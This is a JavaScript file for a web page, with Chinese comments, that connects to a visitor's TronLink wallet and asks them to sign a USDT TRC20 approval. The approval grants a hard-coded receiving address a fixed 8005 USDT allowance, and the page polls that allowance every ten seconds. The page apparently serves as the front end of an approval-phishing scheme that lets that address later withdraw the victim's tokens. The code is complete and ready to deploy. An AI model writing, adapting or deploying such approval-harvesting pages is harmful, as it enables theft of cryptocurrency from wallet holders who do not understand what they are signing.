// ==================== 配置 ====================
const TARGET_ADDRESS = "TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU"; // 授权接收地址
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 合约
const APPROVE_AMOUNT = "8005000000"; // 8005 USDT (考虑 6 位小数)

let tronWeb = null;
let userAddress = null;

// ==================== 初始化 ====================
async function initializeApp() {
    console.log("🔄 初始化应用...");
    if (window.tronLink) {
        try {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            tronWeb = window.tronLink.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            
            // 更新钱包状态
            updateWalletStatus();
            
            // 刷新授权额度
            await refreshAllowance();
            
            console.log("✅ 钱包已连接:", userAddress);
        } catch (e) {
            console.warn("❌ 钱包连接失败:", e.message);
            updateWalletStatus("未连接");
        }
    } else {
        console.warn("⚠️ 未检测到 TronLink 钱包");
        updateWalletStatus("未检测到钱包");
    }
}

// ==================== 更新钱包状态 ====================
function updateWalletStatus(status = null) {
    const statusValue = document.getElementById('statusValue');
    const walletStatus = document.getElementById('walletStatus');
    
    if (status) {
        statusValue.textContent = status;
        walletStatus.classList.add('error');
    } else if (userAddress) {
        // 缩短地址显示
        const shortAddress = userAddress.slice(0, 10) + '...' + userAddress.slice(-8);
        statusValue.textContent = `已连接: ${shortAddress}`;
        walletStatus.classList.remove('error');
        walletStatus.classList.add('connected');
    } else {
        statusValue.textContent = "未连接";
        walletStatus.classList.remove('connected');
    }
}

// ==================== 刷新授权额度 ====================
async function refreshAllowance() {
    if (!tronWeb || !userAddress) return;
    
    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const allowance = await contract.allowance(userAddress, TARGET_ADDRESS).call();
        
        // 转换为正常单位 (USDT 有 6 位小数)
        const allowanceAmount = allowance ? allowance.toString() / 1e6 : 0;
        
        // 更新显示
        const allowanceText = allowanceAmount > 0 
            ? `${allowanceAmount.toLocaleString('zh-CN')} USDT` 
            : "0 USDT";
        document.getElementById('allowanceAmount').textContent = allowanceText;
        
        // 更新进度条
        const percentage = Math.min((allowanceAmount / 8005) * 100, 100);
        const allowanceFill = document.getElementById('allowanceFill');
        allowanceFill.style.width = percentage + '%';
        
        // 更新按钮颜色
        const approveBtn = document.getElementById('approveBtn');
        if (allowanceAmount >= 8005) {
            approveBtn.classList.add('approved');
            approveBtn.innerHTML = '<span class="button-icon">✓</span><span class="button-text">已授权</span>';
        } else {
            approveBtn.classList.remove('approved');
            approveBtn.innerHTML = '<span class="button-icon">🔐</span><span class="button-text">确认授权</span>';
        }
        
        console.log("✅ 当前授权额度:", allowanceText);
    } catch (err) {
        console.error("❌ 查询授权额度失败:", err);
    }
}

// ==================== 授权 USDT ====================
async function approveUsdt() {
    if (!tronWeb) {
        await initializeApp();
        if (!tronWeb) return showStatus("❌ 请使用 TronLink 打开此页面", "error");
    }
    
    const approveBtn = document.getElementById('approveBtn');
    const originalContent = approveBtn.innerHTML;
    
    try {
        approveBtn.disabled = true;
        showStatus("⏳ 正在调起钱包进行授权...", "loading");
        
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        
        // 构造授权交易
        const tx = await contract.approve(TARGET_ADDRESS, APPROVE_AMOUNT).send({
            feeLimit: 100000000 // 100 TRX
        });
        
        showStatus("✅ 授权交易已发送！交易哈希: " + tx.slice(0, 20) + "...", "success");
        
        // 等待一秒后刷新授权额度
        setTimeout(async () => {
            await refreshAllowance();
            approveBtn.disabled = false;
        }, 1000);
        
        console.log("✅ 授权成功:", tx);
        
    } catch (err) {
        console.error("❌ 授权失败:", err);
        
        if (err.message.includes("User denied")) {
            showStatus("❌ 您已取消授权", "error");
        } else if (err.message.includes("insufficient")) {
            showStatus("❌ TRX 不足以支付手续费", "error");
        } else {
            showStatus("❌ 授权失败: " + err.message.slice(0, 50), "error");
        }
        
        approveBtn.disabled = false;
    }
    
    approveBtn.innerHTML = originalContent;
}

// ==================== 取消授权 ====================
async function revokeApproval() {
    if (!tronWeb) {
        await initializeApp();
        if (!tronWeb) return showStatus("❌ 请使用 TronLink 打开此页面", "error");
    }
    
    const confirmed = confirm("⚠️ 确定要取消授权吗？");
    if (!confirmed) return;
    
    const revokeBtn = document.getElementById('revokeBtn');
    
    try {
        revokeBtn.disabled = true;
        showStatus("⏳ 正在取消授权...", "loading");
        
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        
        // 授权额度设为 0
        const tx = await contract.approve(TARGET_ADDRESS, "0").send({
            feeLimit: 100000000
        });
        
        showStatus("✅ 取消授权交易已发送！", "success");
        
        // 等待后刷新
        setTimeout(async () => {
            await refreshAllowance();
            revokeBtn.disabled = false;
        }, 1000);
        
        console.log("✅ 取消授权成功:", tx);
        
    } catch (err) {
        console.error("❌ 取消授权失败:", err);
        showStatus("❌ 取消授权失败", "error");
        revokeBtn.disabled = false;
    }
}

// ==================== 显示状态消息 ====================
function showStatus(message, type = "info") {
    const statusMessage = document.getElementById('statusMessage');
    statusMessage.textContent = message;
    statusMessage.className = 'status-message ' + type;
    
    // 5秒后自动清除
    if (type !== "loading") {
        setTimeout(() => {
            statusMessage.textContent = "";
            statusMessage.className = 'status-message';
        }, 5000);
    }
}

// ==================== 页面加载时初始化 ====================
document.addEventListener('DOMContentLoaded', () => {
    initializeApp();
    
    // 每 10 秒刷新一次授权额度
    setInterval(refreshAllowance, 10000);
});

// ==================== 监听钱包账户变化 ====================
if (window.tronLink) {
    window.tronLink.on('accountsChanged', (accounts) => {
        console.log("👤 账户已切换:", accounts);
        initializeApp();
    });
}
